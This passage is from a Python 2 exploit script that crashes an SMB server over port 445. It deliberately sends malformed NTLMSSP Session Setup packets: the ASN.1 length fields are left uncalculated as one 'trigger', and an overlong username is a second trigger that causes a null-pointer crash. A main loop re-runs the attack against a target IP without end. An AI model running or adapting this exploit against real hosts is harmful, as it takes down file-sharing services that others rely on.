        CalculateWorkstationOffset = CalculateUserOffset+str(self.fields["NLMPAuthMsgNtUserName"])

        CalculateLMChallengeOffset = CalculateWorkstationOffset+str(self.fields["NLMPAuthMsgNtWorkstationName"])

        CalculateNTChallengeOffset = CalculateLMChallengeOffset+str(self.fields["NLMPAuthLMChallengeStr"])

        CalculateSessionOffset = CalculateNTChallengeOffset+str(self.fields["NLMPAuthMsgNTLMV1ChallengeResponseStruct"])

        ## Packet len
        self.fields["andxoffset"] = struct.pack("<h", len(CompletePacketLen)+32)
        ##Buff Len
        self.fields["securitybloblength"] = struct.pack("<h", len(SecurityBlobLen))
        ##Complete Buff Len
        self.fields["bcc1"] = struct.pack("<h", len(CompletePacketLen)-27)

	###### ASN Stuff
        if len(SecurityBlobLen) > 255:
	   #self.fields["ApplicationHeaderTagLenOfLen"] = "\x82" --> //BUG not using this calc since it's our trigger.
	   #self.fields["ApplicationHeaderLen"] = struct.pack(">H", len(SecurityBlobLen)-4) #-4 from secbloblen
           pass #Not calculating this one to trigger the bug.
        else:
           #self.fields["ApplicationHeaderTagLenOfLen"] = "\x81" --> //BUG not using this calc since it's our trigger.
	   #self.fields["ApplicationHeaderLen"] = struct.pack(">B", len(SecurityBlobLen)-3)
           pass #Not calculating this one to trigger the bug.
        if len(SecurityBlobLen)-8 > 255:
           self.fields["AsnSecMechLenOfLen"] = "\x82"
	   self.fields["AsnSecMechLen"] = struct.pack(">H", len(SecurityBlobLen)-8) #-8 from secbloblen
        else:
           self.fields["AsnSecMechLenOfLen"] = "\x81"
	   self.fields["AsnSecMechLen"] = struct.pack(">B", len(SecurityBlobLen)-6)

        if len(SecurityBlobLen)-12 > 255:
           self.fields["ChoosedTagLenOfLen"] = "\x82"
           self.fields["ChoosedTagLen"] = struct.pack(">H", len(SecurityBlobLen)-12) #-12 from secbloblen
        else:
           self.fields["ChoosedTagLenOfLen"] = "\x81"
           self.fields["ChoosedTagLen"] = struct.pack(">B", len(SecurityBlobLen)-9)

        if len(SecurityBlobLen)-16 > 255:
           self.fields["ChoosedTag1StrLenOfLen"] = "\x82"
           self.fields["ChoosedTag1StrLen"] = struct.pack(">H", len(SecurityBlobLen)-16) #-16 from secbloblen
        else:
           self.fields["ChoosedTag1StrLenOfLen"] = "\x81"
           self.fields["ChoosedTag1StrLen"] = struct.pack(">B", len(SecurityBlobLen)-12)

        ##### Username Offset Calculation..######
        self.fields["NLMPAuthMsgNtUserNameBuffOffset"] = struct.pack("<i", len(CalculateUserOffset))
        self.fields["NLMPAuthMsgNtUserNameLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNtUserName"])))
        self.fields["NLMPAuthMsgNtUserNameMaxLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNtUserName"])))
        ##### Domain Offset Calculation..######
        self.fields["NLMPAuthMsgNtDomainNameBuffOffset"] = struct.pack("<i", len(CalculateDomainOffset))
        self.fields["NLMPAuthMsgNtDomainNameLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNtDomainName"])))
        self.fields["NLMPAuthMsgNtDomainNameMaxLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNtDomainName"])))
        ##### Workstation Offset Calculation..######
        self.fields["NLMPAuthMsgNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateWorkstationOffset))
        self.fields["NLMPAuthMsgNtWorkstationLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNtWorkstationName"])))
        self.fields["NLMPAuthMsgNtWorkstationMaxLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNtWorkstationName"])))

        ##### NT Challenge Offset Calculation..######
        self.fields["NLMPAuthMsgNtChallengeResponseBuffOffset"] = struct.pack("<i", len(CalculateNTChallengeOffset))
        self.fields["NLMPAuthMsgNtChallengeResponseLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNTLMV1ChallengeResponseStruct"])))
        self.fields["NLMPAuthMsgNtChallengeResponseMaxLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNTLMV1ChallengeResponseStruct"])))

        ##### LM Challenge Offset Calculation..######
        self.fields["NLMPAuthMsgLMChallengeBuffOffset"] = struct.pack("<i", len(CalculateLMChallengeOffset))
        self.fields["NLMPAuthMsgLMChallengeLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthLMChallengeStr"])))
        self.fields["NLMPAuthMsgLMChallengeMaxLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthLMChallengeStr"])))

        ##### SessionKey Offset Calculation..######
        self.fields["NLMPAuthMsgRandomSessionKeyMessageBuffOffset"] = struct.pack("<i", len(CalculateSessionOffset))
        self.fields["NLMPAuthMsgRandomSessionKeyMessageLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNSessionKey"])))
        self.fields["NLMPAuthMsgRandomSessionKeyMessageMaxLen"] = struct.pack("<h", len(str(self.fields["NLMPAuthMsgNSessionKey"])))

######################################################################################################

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

def SendCustomNego(Message):
    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x53\xc8")
    n = SMBNego(Data = SMBNegoData())
    n.calculate()
    packet0 = str(h)+str(n)
    print Message
    return longueur(packet0)+packet0

def handle(data,s):

    ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
    if data[8:10] == "\x72\x00":
       head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x17\xc8",mid="\x40\x00")
       t = SMBSessionData()
       t.calculate()
       final = t 
       packet1 = str(head)+str(final)
       buffer1 = longueur(packet1)+packet1  
       print "[*]Using NT LM 0.12. Now Session Setup NTLMSSP Negotiate."
       s.send(buffer1)

    ##Session Setup AndX Request, NTLMSSP_AUTH, User: \
    if data[8:10] == "\x73\x16":
       head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x17\xc8",uid=data[32:34],mid="\x80\x00")
       t = SMBSession2(NLMPAuthMsgNtUserName="A"*80)#//BUG --> This is the second trigger. Could be any string field in the ntlm packet, like session key, ntlm hash, domain name, etc.
       t.calculate()
       packet1 = str(head)+str(t)
       buffer1 = longueur(packet1)+packet1  
       print "[*]Working..."
       s.send(buffer1)
       data = s.recv(1024)
       #Make sure it doesn't go in a loop.
       if data[8:10] == "\x73\x16":
          s.close()
       #Triggered..
       if data[8:10] == "\x73\x05":
          print "[*]Null PTR Triggered.\n[*]Waiting a bit, the process might be in a loop, Coup de Grace with the next few negotiate protocol."
          sleep(2)
          s.close()
    ##Bad userID on negotiate protocol, backend service crashed.
    if data[8:10] == "\x72\x01":
       print "[*]Server crashed.\n[*]Quitting"
       sys.exit(1)

    ##Not Vulnerable.
    if data[8:10] == "\x73\xbb":
       print "[!]This server is not vulnerable.\n[*]Quitting"
       sys.exit(1)

def run(host):
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_LINGER, struct.pack('ii', 1, 0))#Make sure the connection is really closed. no time_wait
    s.connect(host)  
    s.settimeout(1)
    s.send(SendCustomNego("[+]Negotiating Protocol with the server"))
    try:
       while True:
         data = s.recv(1024)
         if data == None:
            print "[*]Server crashed.\n[*]Quitting"
         handle(data,s)
    except Exception:
         sleep(0.5)
         s.close()
         pass


if __name__ == "__main__":
    if len(sys.argv)<=1:
        sys.exit('Give me an IP.\nUsage:python '+sys.argv[0]+' Target')
    host = sys.argv[1],445
    while True:
       run(host)
